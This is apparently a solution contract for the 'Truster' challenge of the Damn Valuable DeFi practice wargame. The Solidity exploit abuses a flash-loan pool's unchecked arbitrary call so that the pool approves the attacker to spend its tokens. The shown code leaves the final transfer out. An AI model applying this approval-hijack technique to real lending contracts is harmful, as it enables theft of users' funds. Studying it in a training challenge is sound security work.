// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterExploiter {
    function exploit(
        TrusterLenderPool pool,
        IERC20 token,
        address recovery,
        uint256 amount
    ) external {
        // Get approval from pool to spend tokens
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            msg.sender,
            amount
        );
        
        // Execute flash loan with 0 amount to get approval
        pool.flashLoan(0, msg.sender, address(token), data);
    }
}
